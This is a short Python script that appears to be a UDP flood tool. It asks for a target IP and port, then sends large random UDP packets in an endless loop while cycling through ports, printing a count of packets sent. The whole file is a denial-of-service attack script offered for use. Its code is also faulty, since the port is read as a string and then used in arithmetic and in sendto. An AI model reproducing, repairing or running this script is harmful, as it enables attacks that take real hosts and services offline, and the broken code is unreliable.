import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9990)


os.system("clear")
os.system("clear")
os.system("figlet Attack Starting")


ip = input("IP Target : ")
port = input("Port       : ")

print("Starting Attack :")

time.sleep(5)

sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s" %(sent,ip,port))
     if port == 65534:
       port = 1
